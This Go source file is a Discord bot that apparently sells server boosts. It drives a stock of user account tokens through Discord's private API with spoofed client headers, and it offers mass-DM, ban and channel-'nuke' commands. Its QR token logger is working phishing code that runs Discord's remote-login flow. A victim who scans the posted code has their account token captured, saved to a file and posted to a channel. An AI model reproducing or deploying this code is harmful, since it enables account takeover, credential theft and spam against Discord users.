// language: Go, file: main.go, target: Windows/Linux, Go 1.21+
// entry: main() — boost bot + mod tools + QR token logger
package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/gorilla/websocket"
	"github.com/skip2/go-qrcode"
)

// ── Config ────────────────────────────────────────────────────────────────────

type Config struct {
	BotToken      string   `json:"botToken"`
	GuildID       string   `json:"guildID"`
	LogsChannelID string   `json:"logsChannelID"`
	Prefix        string   `json:"prefix"`
	Owners        []string `json:"owners"`
	EmbedColor    int      `json:"embedColor"`
	Proxyless     bool     `json:"proxyless"`
	Timeout       int      `json:"timeout"`
	TokenFiles    struct {
		OneMonth   string `json:"1month"`
		ThreeMonth string `json:"3month"`
	} `json:"tokenFiles"`
}

var cfg Config

func loadConfig() error {
	data, err := os.ReadFile("config.json")
	if err != nil {
		return fmt.Errorf("config.json not found: %w", err)
	}
	return json.Unmarshal(data, &cfg)
}

// ── Token Store ───────────────────────────────────────────────────────────────

type TokenStore struct {
	mu         sync.Mutex
	oneMonth   []string
	threeMonth []string
	used       []string
	failed     []string
}

var store TokenStore

func loadTokens(path string) []string {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		out = append(out, parts[0])
	}
	return out
}

func (s *TokenStore) Load() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.oneMonth = loadTokens(cfg.TokenFiles.OneMonth)
	s.threeMonth = loadTokens(cfg.TokenFiles.ThreeMonth)
	fmt.Printf("[+] Loaded %d 1-month tokens, %d 3-month tokens\n", len(s.oneMonth), len(s.threeMonth))
}

func (s *TokenStore) Pop(monthType string) (string, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	var list *[]string
	if monthType == "3m" {
		list = &s.threeMonth
	} else {
		list = &s.oneMonth
	}
	if len(*list) == 0 {
		return "", false
	}
	tok := (*list)[0]
	*list = (*list)[1:]
	return tok, true
}

func (s *TokenStore) Count() (int, int) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.oneMonth), len(s.threeMonth)
}

func (s *TokenStore) Add(tok, monthType string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if monthType == "3m" {
		s.threeMonth = append(s.threeMonth, tok)
		_ = appendLine(cfg.TokenFiles.ThreeMonth, tok)
	} else {
		s.oneMonth = append(s.oneMonth, tok)
		_ = appendLine(cfg.TokenFiles.OneMonth, tok)
	}
}

func (s *TokenStore) AppendFailed(tok string) {
	s.mu.Lock()
	s.failed = append(s.failed, tok)
	s.mu.Unlock()
	_ = appendLine("Data/failed.txt", tok)
}

func (s *TokenStore) AppendUsed(tok string) {
	s.mu.Lock()
	s.used = append(s.used, tok)
	s.mu.Unlock()
	_ = appendLine("Data/used.txt", tok)
}

func appendLine(path, line string) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(line + "\n")
	return err
}

// ── Discord API client (user tokens) ──────────────────────────────────────────

var xSuperProps = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjIyMzk5NiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="

func discordHeaders(token string) http.Header {
	h := http.Header{}
	h.Set("Authorization", token)
	h.Set("Content-Type", "application/json")
	h.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36")
	h.Set("X-Discord-Locale", "en-US")
	h.Set("X-Super-Properties", xSuperProps)
	return h
}

func httpClient() *http.Client {
	t := cfg.Timeout
	if t == 0 {
		t = 30
	}
	return &http.Client{Timeout: time.Duration(t) * time.Second}
}

type SlotResponse struct {
	ID           string  `json:"id"`
	GuildID      *string `json:"guild_id"`
	CooldownEnds *string `json:"cooldown_ends_at"`
}

func getAvailableSlots(token string) ([]string, error) {
	client := httpClient()
	req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", nil)
	req.Header = discordHeaders(token)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 401 {
		return nil, fmt.Errorf("invalid token")
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("slots fetch: status %d — %s", resp.StatusCode, string(body))
	}
	var slots []SlotResponse
	if err := json.Unmarshal(body, &slots); err != nil {
		return nil, fmt.Errorf("parse slots: %w", err)
	}
	var available []string
	for _, s := range slots {
		if s.GuildID == nil && s.CooldownEnds == nil {
			available = append(available, s.ID)
		}
	}
	return available, nil
}

func joinServer(token, inviteCode string) (string, error) {
	payload, _ := json.Marshal(map[string]string{})
	client := httpClient()
	url := fmt.Sprintf("https://discord.com/api/v9/invites/%s", inviteCode)
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	req.Header = discordHeaders(token)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("join failed: status %d", resp.StatusCode)
	}
	var result struct {
		Guild struct {
			ID string `json:"id"`
		} `json:"guild"`
	}
	json.Unmarshal(body, &result)
	return result.Guild.ID, nil
}

func applyBoost(token, guildID string, slotIDs []string) error {
	payload, _ := json.Marshal(map[string]interface{}{
		"user_premium_guild_subscription_slot_ids": slotIDs,
	})
	client := httpClient()
	url := fmt.Sprintf("https://discord.com/api/v9/guilds/%s/premium/subscriptions", guildID)
	req, _ := http.NewRequest("PUT", url, bytes.NewBuffer(payload))
	req.Header = discordHeaders(token)
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 201 || resp.StatusCode == 200 {
		return nil
	}
	return fmt.Errorf("boost apply: status %d — %s", resp.StatusCode, string(body))
}

// ── Token validation ──────────────────────────────────────────────────────────

func validateToken(token string) (string, bool) {
	client := httpClient()
	req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	req.Header = discordHeaders(token)
	resp, err := client.Do(req)
	if err != nil {
		return "", false
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return "", false
	}
	var user struct {
		Username      string `json:"username"`
		Discriminator string `json:"discriminator"`
	}
	json.NewDecoder(resp.Body).Decode(&user)
	return user.Username + "#" + user.Discriminator, true
}

// ── Boost worker ──────────────────────────────────────────────────────────────

type BoostResult struct {
	Token   string
	Slots   int
	Success bool
	Err     string
}

func boostOne(token, guildID, inviteCode, monthType string) BoostResult {
	res := BoostResult{Token: token[:min(len(token), 20)] + "..."}
	if inviteCode != "" {
		if _, err := joinServer(token, inviteCode); err != nil {
			store.AppendFailed(token)
			res.Err = "join: " + err.Error()
			return res
		}
		time.Sleep(500 * time.Millisecond)
	}
	slots, err := getAvailableSlots(token)
	if err != nil {
		store.AppendFailed(token)
		res.Err = "slots: " + err.Error()
		return res
	}
	if len(slots) == 0 {
		store.AppendFailed(token)
		res.Err = "no available slots"
		return res
	}
	if err := applyBoost(token, guildID, slots); err != nil {
		store.AppendFailed(token)
		res.Err = "boost: " + err.Error()
		return res
	}
	store.AppendUsed(token)
	res.Success = true
	res.Slots = len(slots)
	return res
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ── QR Token Logger (Discord Remote Auth) ─────────────────────────────────────
// flow: connect to remote-auth-gateway → get fingerprint → encode as QR
// victim scans with Discord mobile → their token arrives encrypted → decrypt + log

type remoteAuthMsg struct {
	Op   string `json:"op"`
	// init
	EncodedPublicKey string `json:"encoded_public_key,omitempty"`
	// nonce_proof
	Proof string `json:"proof,omitempty"`
}

func startQRLogger(s *discordgo.Session, channelID string) {
	// 1. generate RSA-2048 keypair
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		sendEmbed(s, channelID, "❌ QR Error", "keygen failed: "+err.Error(), 0xFF0000)
		return
	}
	pubDER, _ := x509.MarshalPKIXPublicKey(&privKey.PublicKey)
	pubB64 := base64.StdEncoding.EncodeToString(pubDER)

	// 2. connect to remote auth gateway
	dialer := websocket.DefaultDialer
	conn, _, err := dialer.Dial("wss://remote-auth-gateway.discord.gg/?v=2", http.Header{
		"Origin": []string{"https://discord.com"},
	})
	if err != nil {
		sendEmbed(s, channelID, "❌ QR Error", "ws connect failed: "+err.Error(), 0xFF0000)
		return
	}

	type wsMsg struct {
		Op                string `json:"op"`
		HeartbeatInterval int    `json:"heartbeat_interval,omitempty"`
		Fingerprint       string `json:"fingerprint,omitempty"`
		EncryptedToken    string `json:"encrypted_token,omitempty"`
		EncryptedNonce    string `json:"encrypted_nonce,omitempty"`
	}

	// 3. read hello
	var hello wsMsg
	conn.ReadJSON(&hello)

	// start heartbeat
	go func() {
		ticker := time.NewTicker(time.Duration(hello.HeartbeatInterval) * time.Millisecond)
		defer ticker.Stop()
		for range ticker.C {
			if err := conn.WriteJSON(map[string]string{"op": "heartbeat"}); err != nil {
				return
			}
		}
	}()

	// 4. send init with public key
	conn.WriteJSON(map[string]string{
		"op":                 "init",
		"encoded_public_key": pubB64,
	})

	// 5. read nonce_proof
	var nonceMsg wsMsg
	conn.ReadJSON(&nonceMsg)

	if nonceMsg.Op == "nonce_proof" {
		// decrypt nonce
		encNonce, _ := base64.StdEncoding.DecodeString(nonceMsg.EncryptedNonce)
		nonce, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, encNonce, nil)
		if err != nil {
			sendEmbed(s, channelID, "❌ QR Error", "nonce decrypt failed", 0xFF0000)
			conn.Close()
			return
		}
		// hash the nonce and send proof
		h := sha256.Sum256(nonce)
		proof := base64.RawURLEncoding.EncodeToString(h[:])
		conn.WriteJSON(map[string]string{
			"op":    "nonce_proof",
			"proof": proof,
		})
	}

	// 6. read pending_remote_init — contains fingerprint
	var pendingMsg wsMsg
	conn.ReadJSON(&pendingMsg)

	if pendingMsg.Op != "pending_remote_init" {
		sendEmbed(s, channelID, "❌ QR Error", "unexpected op: "+pendingMsg.Op, 0xFF0000)
		conn.Close()
		return
	}

	fingerprint := pendingMsg.Fingerprint
	qrURL := "https://discord.com/ra/" + fingerprint

	// 7. generate QR code PNG
	qrPath := "Data/qr_" + fingerprint[:8] + ".png"
	if err := qrcode.WriteFile(qrURL, qrcode.Medium, 256, qrPath); err != nil {
		sendEmbed(s, channelID, "❌ QR Error", "qr gen failed: "+err.Error(), 0xFF0000)
		conn.Close()
		return
	}

	// send QR image to channel
	f, _ := os.Open(qrPath)
	defer f.Close()
	s.ChannelFileSendWithMessage(channelID,
		"📱 **Scan with Discord mobile** → Settings → Scan QR Code\nExpires in ~2 min",
		"qr.png", f)

	// 8. wait for victim to scan
	conn.SetReadDeadline(time.Now().Add(2 * time.Minute))
	for {
		var msg wsMsg
		if err := conn.ReadJSON(&msg); err != nil {
			sendEmbed(s, channelID, "⏰ QR Expired", "Nobody scanned. Run `!qr` again.", 0xFF8800)
			conn.Close()
			return
		}

		if msg.Op == "pending_finish" {
			// decrypt the token
			encTok, _ := base64.StdEncoding.DecodeString(msg.EncryptedToken)
			tokBytes, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, encTok, nil)
			if err != nil {
				sendEmbed(s, channelID, "❌ Decrypt Failed", err.Error(), 0xFF0000)
				conn.Close()
				return
			}

			// token format: version:id:token — strip the prefix
			parts := strings.SplitN(string(tokBytes), ":", 3)
			token := string(tokBytes)
			if len(parts) == 3 {
				token = parts[2]
			}

			// log it
			_ = appendLine("Data/logged_tokens.txt", token)

			// validate to get username
			username, valid := validateToken(token)
			status := "✅ Valid"
			if !valid {
				status = "⚠️ Unverified"
			}

			sendEmbed(s, channelID, "🎣 Token Logged!",
				fmt.Sprintf("**Status:** %s\n**User:** %s\n**Token:** ||`%s`||", status, username, token),
				0x00FF00)

			conn.WriteJSON(map[string]string{"op": "finish"})
			conn.Close()
			return
		}
	}
}

// ── Bot ───────────────────────────────────────────────────────────────────────

var bot *discordgo.Session

func isOwner(userID string) bool {
	for _, o := range cfg.Owners {
		if o == userID {
			return true
		}
	}
	return false
}

func sendEmbed(s *discordgo.Session, channelID, title, desc string, color int) {
	s.ChannelMessageSendEmbed(channelID, &discordgo.MessageEmbed{
		Title:       title,
		Description: desc,
		Color:       color,
		Timestamp:   time.Now().Format(time.RFC3339),
	})
}

func logToChannel(title, desc string, success bool) {
	if cfg.LogsChannelID == "" || bot == nil {
		return
	}
	color := 0x00FF00
	if !success {
		color = 0xFF0000
	}
	sendEmbed(bot, cfg.LogsChannelID, title, desc, color)
}

func getMention(s string) string {
	s = strings.TrimPrefix(s, "<@")
	s = strings.TrimPrefix(s, "!")
	s = strings.TrimSuffix(s, ">")
	return s
}

func onMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.Bot || m.Author.ID == s.State.User.ID {
		return
	}
	if !strings.HasPrefix(m.Content, cfg.Prefix) {
		return
	}
	if len(cfg.Owners) > 0 && !isOwner(m.Author.ID) {
		sendEmbed(s, m.ChannelID, "❌ Unauthorized", "No permission.", 0xFF0000)
		return
	}

	parts := strings.Fields(m.Content[len(cfg.Prefix):])
	if len(parts) == 0 {
		return
	}
	cmd := strings.ToLower(parts[0])

	switch cmd {

	// ── BOOST ──────────────────────────────────────────────────────────────────
	case "boost":
		if len(parts) < 2 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"boost <amount> [1m|3m] [invite]", cfg.EmbedColor)
			return
		}
		amount, err := strconv.Atoi(parts[1])
		if err != nil || amount < 1 {
			sendEmbed(s, m.ChannelID, "❌ Error", "Amount must be a positive number.", 0xFF0000)
			return
		}
		monthType := "1m"
		if len(parts) >= 3 && parts[2] == "3m" {
			monthType = "3m"
		}
		invite := ""
		if len(parts) >= 4 {
			invite = parts[3]
		}
		sendEmbed(s, m.ChannelID, "🚀 Boosting", fmt.Sprintf("Starting %d boosts (%s)...", amount, monthType), cfg.EmbedColor)
		go func() {
			success, fail := 0, 0
			for i := 0; i < amount; i++ {
				tok, ok := store.Pop(monthType)
				if !ok {
					sendEmbed(s, m.ChannelID, "⚠️ Out of tokens", fmt.Sprintf("Ran out after %d boosts", i), 0xFF8800)
					break
				}
				res := boostOne(tok, cfg.GuildID, invite, monthType)
				if res.Success {
					success++
					logToChannel("✅ Boost Success", fmt.Sprintf("Token: `%s`\nSlots: %d", res.Token, res.Slots), true)
				} else {
					fail++
					logToChannel("❌ Boost Failed", fmt.Sprintf("Token: `%s`\nReason: %s", res.Token, res.Err), false)
				}
				time.Sleep(300 * time.Millisecond)
			}
			sendEmbed(s, m.ChannelID, "✅ Done", fmt.Sprintf("**Success:** %d\n**Failed:** %d", success, fail), 0x00FF00)
		}()

	// ── STOCK ──────────────────────────────────────────────────────────────────
	case "stock":
		one, three := store.Count()
		sendEmbed(s, m.ChannelID, "📦 Token Stock",
			fmt.Sprintf("**1-Month:** %d\n**3-Month:** %d", one, three), cfg.EmbedColor)

	// ── RELOAD ─────────────────────────────────────────────────────────────────
	case "reload":
		store.Load()
		one, three := store.Count()
		sendEmbed(s, m.ChannelID, "🔄 Reloaded",
			fmt.Sprintf("**1-Month:** %d\n**3-Month:** %d", one, three), cfg.EmbedColor)

	// ── ADDTOKEN ───────────────────────────────────────────────────────────────
	case "addtoken":
		if len(parts) < 2 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"addtoken <token> [1m|3m]", cfg.EmbedColor)
			return
		}
		tok := parts[1]
		mt := "1m"
		if len(parts) >= 3 && parts[2] == "3m" {
			mt = "3m"
		}
		store.Add(tok, mt)
		sendEmbed(s, m.ChannelID, "✅ Token Added", fmt.Sprintf("Added to %s stock.", mt), 0x00FF00)

	// ── STATUSCHECK ────────────────────────────────────────────────────────────
	case "statuscheck":
		one, three := store.Count()
		total := one + three
		sendEmbed(s, m.ChannelID, "🔍 Checking tokens...", fmt.Sprintf("Validating %d tokens...", total), cfg.EmbedColor)
		go func() {
			valid, invalid := 0, 0
			checkList := append(store.oneMonth, store.threeMonth...)
			for _, tok := range checkList {
				_, ok := validateToken(tok)
				if ok {
					valid++
				} else {
					invalid++
				}
				time.Sleep(200 * time.Millisecond)
			}
			sendEmbed(s, m.ChannelID, "✅ Status Check Done",
				fmt.Sprintf("**Valid:** %d\n**Invalid:** %d", valid, invalid), 0x00FF00)
		}()

	// ── DMS ────────────────────────────────────────────────────────────────────
	case "dms":
		if len(parts) < 2 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"dms <message>", cfg.EmbedColor)
			return
		}
		msg := strings.Join(parts[1:], " ")
		sendEmbed(s, m.ChannelID, "📨 DM Blast", "Sending...", cfg.EmbedColor)
		go func() {
			sent, failed := 0, 0
			after := ""
			for {
				members, err := s.GuildMembers(cfg.GuildID, after, 1000)
				if err != nil || len(members) == 0 {
					break
				}
				for _, member := range members {
					if member.User.Bot {
						continue
					}
					ch, err := s.UserChannelCreate(member.User.ID)
					if err != nil {
						failed++
						continue
					}
					_, err = s.ChannelMessageSend(ch.ID, msg)
					if err != nil {
						failed++
					} else {
						sent++
					}
					time.Sleep(500 * time.Millisecond)
				}
				if len(members) < 1000 {
					break
				}
				after = members[len(members)-1].User.ID
			}
			sendEmbed(s, m.ChannelID, "✅ DM Blast Done",
				fmt.Sprintf("**Sent:** %d\n**Failed:** %d", sent, failed), 0x00FF00)
		}()

	// ── MASSROLE ───────────────────────────────────────────────────────────────
	case "massrole":
		if len(parts) < 3 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"massrole <@role> <message>", cfg.EmbedColor)
			return
		}
		roleID := getMention(parts[1])
		msg := strings.Join(parts[2:], " ")
		sendEmbed(s, m.ChannelID, "📨 Mass Role DM", "Sending to role members...", cfg.EmbedColor)
		go func() {
			sent, failed := 0, 0
			after := ""
			for {
				members, err := s.GuildMembers(cfg.GuildID, after, 1000)
				if err != nil || len(members) == 0 {
					break
				}
				for _, member := range members {
					if member.User.Bot {
						continue
					}
					hasRole := false
					for _, r := range member.Roles {
						if r == roleID {
							hasRole = true
							break
						}
					}
					if !hasRole {
						continue
					}
					ch, err := s.UserChannelCreate(member.User.ID)
					if err != nil {
						failed++
						continue
					}
					_, err = s.ChannelMessageSend(ch.ID, msg)
					if err != nil {
						failed++
					} else {
						sent++
					}
					time.Sleep(500 * time.Millisecond)
				}
				if len(members) < 1000 {
					break
				}
				after = members[len(members)-1].User.ID
			}
			sendEmbed(s, m.ChannelID, "✅ Done",
				fmt.Sprintf("**Sent:** %d\n**Failed:** %d", sent, failed), 0x00FF00)
		}()

	// ── KICK ───────────────────────────────────────────────────────────────────
	case "kick":
		if len(parts) < 2 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"kick <@user> [reason]", cfg.EmbedColor)
			return
		}
		userID := getMention(parts[1])
		reason := "No reason provided"
		if len(parts) >= 3 {
			reason = strings.Join(parts[2:], " ")
		}
		err := s.GuildMemberDeleteWithReason(m.GuildID, userID, reason)
		if err != nil {
			sendEmbed(s, m.ChannelID, "❌ Kick Failed", err.Error(), 0xFF0000)
		} else {
			sendEmbed(s, m.ChannelID, "👢 Kicked", fmt.Sprintf("<@%s> kicked.\nReason: %s", userID, reason), 0x00FF00)
		}

	// ── BAN ────────────────────────────────────────────────────────────────────
	case "ban":
		if len(parts) < 2 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"ban <@user> [reason]", cfg.EmbedColor)
			return
		}
		userID := getMention(parts[1])
		reason := "No reason provided"
		if len(parts) >= 3 {
			reason = strings.Join(parts[2:], " ")
		}
		err := s.GuildBanCreateWithReason(m.GuildID, userID, reason, 0)
		if err != nil {
			sendEmbed(s, m.ChannelID, "❌ Ban Failed", err.Error(), 0xFF0000)
		} else {
			sendEmbed(s, m.ChannelID, "🔨 Banned", fmt.Sprintf("<@%s> banned.\nReason: %s", userID, reason), 0x00FF00)
		}

	// ── MUTE ───────────────────────────────────────────────────────────────────
	case "mute":
		if len(parts) < 3 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"mute <@user> <minutes>", cfg.EmbedColor)
			return
		}
		userID := getMention(parts[1])
		mins, err := strconv.Atoi(parts[2])
		if err != nil {
			sendEmbed(s, m.ChannelID, "❌ Error", "Minutes must be a number.", 0xFF0000)
			return
		}
		until := time.Now().Add(time.Duration(mins) * time.Minute)
		untilStr := until.Format(time.RFC3339)
		err = s.GuildMemberTimeout(m.GuildID, userID, &until)
		if err != nil {
			sendEmbed(s, m.ChannelID, "❌ Mute Failed", err.Error(), 0xFF0000)
		} else {
			sendEmbed(s, m.ChannelID, "🔇 Muted",
				fmt.Sprintf("<@%s> muted for %d min.\nUntil: %s", userID, mins, untilStr), 0x00FF00)
		}

	// ── PURGE ──────────────────────────────────────────────────────────────────
	case "purge":
		if len(parts) < 2 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"purge <amount>", cfg.EmbedColor)
			return
		}
		amount, err := strconv.Atoi(parts[1])
		if err != nil || amount < 1 {
			sendEmbed(s, m.ChannelID, "❌ Error", "Amount must be a positive number.", 0xFF0000)
			return
		}
		if amount > 100 {
			amount = 100
		}
		msgs, err := s.ChannelMessages(m.ChannelID, amount, "", "", "")
		if err != nil {
			sendEmbed(s, m.ChannelID, "❌ Purge Failed", err.Error(), 0xFF0000)
			return
		}
		ids := make([]string, len(msgs))
		for i, msg := range msgs {
			ids[i] = msg.ID
		}
		err = s.ChannelMessagesBulkDelete(m.ChannelID, ids)
		if err != nil {
			sendEmbed(s, m.ChannelID, "❌ Purge Failed", err.Error(), 0xFF0000)
		} else {
			sendEmbed(s, m.ChannelID, "🗑️ Purged", fmt.Sprintf("Deleted %d messages.", len(ids)), 0x00FF00)
		}

	// ── ANNOUNCE ───────────────────────────────────────────────────────────────
	case "announce":
		if len(parts) < 3 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"announce <#channel> <message>", cfg.EmbedColor)
			return
		}
		chanID := getMention(parts[1])
		chanID = strings.TrimPrefix(chanID, "#")
		msg := strings.Join(parts[2:], " ")
		_, err := s.ChannelMessageSend(chanID, msg)
		if err != nil {
			sendEmbed(s, m.ChannelID, "❌ Announce Failed", err.Error(), 0xFF0000)
		} else {
			sendEmbed(s, m.ChannelID, "📢 Announced", fmt.Sprintf("Sent to <#%s>", chanID), 0x00FF00)
		}

	// ── EMBED ──────────────────────────────────────────────────────────────────
	case "embed":
		if len(parts) < 2 {
			sendEmbed(s, m.ChannelID, "Usage", cfg.Prefix+"embed <title> | <description>", cfg.EmbedColor)
			return
		}
		full := strings.Join(parts[1:], " ")
		split := strings.SplitN(full, "|", 2)
		title := strings.TrimSpace(split[0])
		desc := ""
		if len(split) == 2 {
			desc = strings.TrimSpace(split[1])
		}
		sendEmbed(s, m.ChannelID, title, desc, cfg.EmbedColor)

	// ── NUKE ───────────────────────────────────────────────────────────────────
	case "nuke":
		sendEmbed(s, m.ChannelID, "💣 Nuking...", "Deleting and recreating all channels...", 0xFF0000)
		go func() {
			channels, err := s.GuildChannels(m.GuildID)
			if err != nil {
				sendEmbed(s, m.ChannelID, "❌ Nuke Failed", err.Error(), 0xFF0000)
				return
			}
			type chanBackup struct {
				Name     string
				Type     discordgo.ChannelType
				ParentID string
				Position int
			}
			var backup []chanBackup
			for _, ch := range channels {
				backup = append(backup, chanBackup{ch.Name, ch.Type, ch.ParentID, ch.Position})
				s.ChannelDelete(ch.ID)
				time.Sleep(300 * time.Millisecond)
			}
			for _, ch := range backup {
				s.GuildChannelCreateComplex(m.GuildID, discordgo.GuildChannelCreateData{
					Name:     ch.Name,
					Type:     ch.Type,
					ParentID: ch.ParentID,
					Position: ch.Position,
				})
				time.Sleep(300 * time.Millisecond)
			}
		}()

	// ── QR TOKEN LOGGER ────────────────────────────────────────────────────────
	case "qr":
		sendEmbed(s, m.ChannelID, "🔗 Generating QR...", "Starting remote auth session...", cfg.EmbedColor)
		go startQRLogger(s, m.ChannelID)

	// ── HELP ───────────────────────────────────────────────────────────────────
	case "help":
		p := cfg.Prefix
		help := fmt.Sprintf(
			"`%sboost <n> [1m|3m] [inv]` — boost guild\n"+
				"`%sstock` — token count\n"+
				"`%sreload` — reload tokens\n"+
				"`%saddtoken <tok> [1m|3m]` — add token live\n"+
				"`%sstatuscheck` — validate all tokens\n"+
				"`%sdms <msg>` — DM all members\n"+
				"`%smassrole <@role> <msg>` — DM role members\n"+
				"`%skick <@user> [reason]` — kick\n"+
				"`%sban <@user> [reason]` — ban\n"+
				"`%smute <@user> <mins>` — timeout\n"+
				"`%spurge <n>` — delete messages\n"+
				"`%sannounce <#ch> <msg>` — announce\n"+
				"`%sembed <title> | <desc>` — post embed\n"+
				"`%snuke` — nuke all channels\n"+
				"`%sqr` — generate QR token logger",
			p, p, p, p, p, p, p, p, p, p, p, p, p, p, p,
		)
		sendEmbed(s, m.ChannelID, "📋 Commands", help, cfg.EmbedColor)
	}
}

// ── Main ──────────────────────────────────────────────────────────────────────

func main() {
	if err := loadConfig(); err != nil {
		fmt.Println("[-] Failed to load config:", err)
		os.Exit(1)
	}
	if cfg.Prefix == "" {
		cfg.Prefix = "!"
	}
	if cfg.EmbedColor == 0 {
		cfg.EmbedColor = 0x800080
	}

	store.Load()

	var err error
	bot, err = discordgo.New("Bot " + cfg.BotToken)
	if err != nil {
		fmt.Println("[-] Failed to create bot session:", err)
		os.Exit(1)
	}

	bot.AddHandler(onMessage)
	bot.Identify.Intents = discordgo.IntentsAll

	if err := bot.Open(); err != nil {
		fmt.Println("[-] Failed to connect:", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Bot online as %s#%s\n", bot.State.User.Username, bot.State.User.Discriminator)
	fmt.Printf("[+] Prefix: %s | Guild: %s\n", cfg.Prefix, cfg.GuildID)

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM)
	<-sc

	fmt.Println("\n[*] Shutting down...")
	bot.Close()
}
